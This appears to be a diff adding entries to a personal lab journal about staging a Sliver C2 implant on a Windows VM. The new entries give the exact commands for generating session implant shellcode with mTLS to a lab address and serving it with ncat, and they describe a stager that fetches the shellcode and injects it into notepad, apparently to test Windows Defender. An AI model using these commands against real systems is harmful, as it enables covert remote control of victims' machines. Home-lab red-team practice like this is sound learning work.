@@ -187,5 +187,17 @@ Generating a default executable beacon implant to see if Windows Defender will p
 ### April 4
 creating a custom stager to get the implant on the Windows machine. I'm developing the stager on the vm because I've read that it is better to develop code meant for Windows on Windows.
 
+---
 
+### April 7
+
+apparently stage-listener expects the receiver to speak sliver's protocol(whatever that means). New approach is to generate manually a beacon implant shellcode and then host it on a TCP listneer.
+
+### April 8
+
+Generating session implant shellcode. This is the one I retrieve using my stager and inject into a process on Windows. `generate --mtls 192.168.56.1:443 --format shellcode --name FLYING_PENCIL --save session_implant.bin`. So the implant name is FLYING_PENCIL. The .bin is session_implant.bin.
+
+### April 10
+
+I GOT THROUGH! I build the stager code into an executable, and double click it, run `sudo ncat -lvnp 8000 --send-only --exec "/bin/cat session_implant.bin"` on my linux machine to transfer the implant shellcode, and the stager will fetch the implant and execute it into a process (i used notepad).
 
